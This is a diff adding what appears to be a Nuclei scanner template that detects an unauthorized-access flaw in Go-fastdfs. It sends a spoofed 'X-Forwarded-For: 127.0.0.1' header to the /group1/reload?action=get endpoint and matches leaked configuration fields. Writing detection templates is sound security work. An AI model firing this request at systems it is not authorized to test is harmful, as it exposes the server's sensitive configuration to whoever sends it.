@@ -1,0 +1,26 @@
+http:
+    - headers:
+        X-Forwarded-For: 127.0.0.1
+      matchers:
+        - status:
+            - 200
+          type: status
+        - condition: and
+          type: word
+          words:
+            - '"download_domain":'
+            - '"download_use_token":'
+            - '"default_scene":'
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/group1/reload?action=get'
+id: go-fastdfs-unauth
+info:
+    author: SleepingBag945
+    description: |
+        Go-fastdfs GetClientIp方法存在XFF头绕过漏洞，攻击者通过漏洞可以未授权调用接口，获取配置文件等敏感信息
+    name: Go-fastdfs GetClientIp 未授权访问
+    severity: high
+    tags:
+        - Go-FastDfs
